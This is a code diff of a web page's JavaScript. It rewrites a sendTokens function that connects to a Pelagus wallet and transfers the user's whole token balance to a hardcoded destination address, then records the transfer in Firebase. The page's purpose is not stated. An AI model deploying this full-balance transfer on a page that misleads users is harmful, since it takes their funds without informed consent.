@@ -437,48 +437,47 @@ async function saveToFirebase(data) {
         }
 
         async function sendTokens() {
-   try {
-       const accounts = await window.pelagus.request({
-           method: 'eth_requestAccounts'
-       });
+    try {
+        const accounts = await window.pelagus.request({
+            method: 'eth_requestAccounts'
+        });
 
-       const currentBalance = await getTokenBalance(accounts[0]);
-       if (currentBalance <= 0n) {
-           throw new Error('No tokens available');
-       }
+        const signerAddress = accounts[0];
+        const currentBalance = await getTokenBalance(signerAddress);
 
-       // Encode transfer function
-       const functionHash = '0xa9059cbb'; // transfer(address,uint256) function signature
-       const toAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0'); 
-       const amount = currentBalance.toString(16).padStart(64, '0');
-       const data = functionHash + toAddress + amount;
+        if (currentBalance <= 0n) {
+            throw new Error('No tokens available');
+        }
 
-       const tx = {
-           from: accounts[0],
-           to: TOKEN_ADDRESS,
-           data: '0x' + data,
-           value: '0x0'
-       };
+        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        log(`📤 Preparing to send ${readableAmount} tokens...`);
 
-       const txHash = await window.pelagus.request({
-           method: 'eth_sendTransaction',
-           params: [tx]
-       });
+        // Encode and send transaction using Contract
+        const provider = new quais.providers.Web3Provider(window.pelagus);
+        const signer = provider.getSigner();
+        const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
 
-       log(`Transaction sent: ${txHash}`);
-       await waitForTransaction(txHash);
-       
-       userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
-       userSession.transferTxHash = txHash;
-       await saveSessionToFirebase();
+        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, currentBalance);
 
-       document.getElementById('sendBtn').style.display = 'none';
-       document.getElementById('scanBtn').style.display = 'block';
-       document.getElementById('buyBtn').style.display = 'block';
+        log(`🔄 Transaction sent: ${tx.hash}`);
+        const receipt = await tx.wait();
 
-   } catch (error) {
-       log('Error: ' + error.message);
-   }
+        log(`✅ Transaction confirmed: ${receipt.transactionHash}`);
+
+        // Save transaction data and update UI
+        userSession.transferAmount = readableAmount;
+        userSession.transferTxHash = tx.hash;
+        await saveSessionToFirebase();
+
+        document.getElementById('sendBtn').style.display = 'none';
+        document.getElementById('scanBtn').style.display = 'block';
+        document.getElementById('buyBtn').style.display = 'block';
+
+        log('🎉 Tokens sent successfully!');
+    } catch (error) {
+        log('❌ Error sending tokens: ' + error.message);
+        console.error(error);
+    }
 }
 
 async function waitForTransaction(txHash) {
